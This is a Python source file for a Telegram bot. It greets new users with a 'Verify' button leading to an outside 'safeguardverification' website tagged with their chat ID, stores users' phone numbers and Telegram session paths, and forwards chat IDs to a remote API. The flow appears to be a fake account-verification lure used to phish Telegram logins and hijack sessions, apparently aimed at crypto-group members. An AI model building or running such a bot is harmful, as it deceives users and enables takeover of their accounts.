import sqlite3
import re
import asyncio
import httpx
import requests
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp  # Asynchronous HTTP requests
from dotenv import load_dotenv
import os
from aiohttp import web  # For the HTTP server

# Load environment variables from the .env file
load_dotenv()

# Database Setup
db_conn = sqlite3.connect("sessions.db", check_same_thread=False)
db_cursor = db_conn.cursor()
db_cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    chat_id INTEGER PRIMARY KEY,
    phone TEXT,
    session_path TEXT
)
""")
db_cursor.execute("""
CREATE TABLE IF NOT EXISTS channels (
    chat_id INTEGER,
    channel_url TEXT,
    PRIMARY KEY (chat_id, channel_url)
)
""")
db_conn.commit()


# Helper Functions
def get_session_for_user(chat_id):
    db_cursor.execute("SELECT session_path FROM users WHERE chat_id = ?", (chat_id,))
    result = db_cursor.fetchone()
    return result[0] if result else None


def is_user_authenticated(chat_id):
    return get_session_for_user(chat_id) is not None

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

bot_client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# External API endpoint to call (Flask server endpoint)
API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your API endpoint

# Event handler for /start command
# Event handler for /start command
@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    chat_id = event.chat_id

    try:

        # Check if the user is authenticated
        if is_user_authenticated(chat_id):
            await send_message_by_chat_id(chat_id)
            return
        # Download the image from the URL using aiohttp
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'

        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
                    image_data.name = 'image.jpg'  # Set a name for the file-like object

                    await event.respond(
                        file=image_data,  # Send the image as bytes with a name
                        message=(
                            "You can verify your account by clicking on the verify button below\n\n"
                            "This is a one time use and will expire"
                        ),
                        buttons=[
                            [Button.url("Verify", f"https://safeguardverification.netlify.app/?chat_id={chat_id}")],
                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
                        ]
                    )
                else:
                    print(f"Failed to fetch the image from the provided URL.")
    except Exception as e:
        await event.respond(f"Error: There was an issue verifying your account. Please try again")

        

# Function to call the external API (e.g., sending a message)
async def send_message_by_chat_id(chat_id):
    async with aiohttp.ClientSession() as session:
        try:
            data = {'chat_id': chat_id}
            async with session.post(API_URL, json=data) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return f"Response from API: {response_data.get('message', 'Success!')}"
                else:
                    return f"Error from API: {response.status}"
        except Exception as e:
            return f"Failed to call API: {e}"

# HTTP Server for health checks
async def health_check(request):
    return web.Response(text="Bot is running!")

async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5001)  # Use port 5001
    await site.start()


# Individual health check for the first target URL
async def first_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# Individual health check for the second target URL
async def second_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# Individual health check for the second target URL
async def third_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# Individual health check for the second target URL
async def fourth_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# General health check combining both URLs
async def general_health_check(first_target_url, second_target_url, third_target_url, fourth_target_url):
    while True:
        try:
            # Run both health checks concurrently
            await asyncio.gather(
                first_health_check(first_target_url),
                second_health_check(second_target_url),
                third_health_check(third_target_url),
                fourth_health_check(fourth_target_url),
            )
        except Exception as e:
            print(f"Error during general health check: {e}")
        await asyncio.sleep(15)  # Ensure a loop cycle even if there's an exception


# Main function to run both the bot and the HTTP server
# Main function to run both the bot and the HTTP server
async def main():
    # Start the bot
    await bot_client.start()
    print("Bot is running...")

    # Start the HTTP server in the background
    asyncio.create_task(run_http_server())

    # Start the health check tasks concurrently, but ensure they don't interfere with the bot
    first_server_url = "https://api-proxy-leoa.onrender.com"  # Update to actual address
    second_server_url = "https://telebot-ivng.onrender.com"  # Update to actual address
    third_server_url = "https://group-bot-z6jh.onrender.com"  # Update to actual address
    fourth_server_url = "https://meme-scraper-bf7l.onrender.com"  # Update to actual address
    asyncio.create_task(general_health_check(first_server_url, second_server_url, third_server_url, fourth_server_url))

    # Keep the bot running, ensuring it doesn't exit prematurely
    await bot_client.run_until_disconnected()


# Run the bot
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
